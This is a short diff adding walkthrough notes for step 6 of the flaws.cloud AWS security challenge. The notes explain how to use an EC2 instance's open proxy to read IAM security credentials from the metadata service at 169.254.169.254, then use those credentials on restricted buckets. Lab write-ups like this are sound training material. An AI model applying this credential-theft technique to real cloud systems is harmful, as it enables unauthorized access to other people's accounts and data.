@@ -26,4 +26,6 @@
   
 6.) Get metadata through HTTP proxy on ec2 instance
   - AWS has a running instance for metadata at the webserver here: http://169.254.169.254/
-  -
+  - Use the proxy to request this metadata service to grab security credentials: (http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/)
+  - Use these creds to access buckets you were not supposed to access!
+  
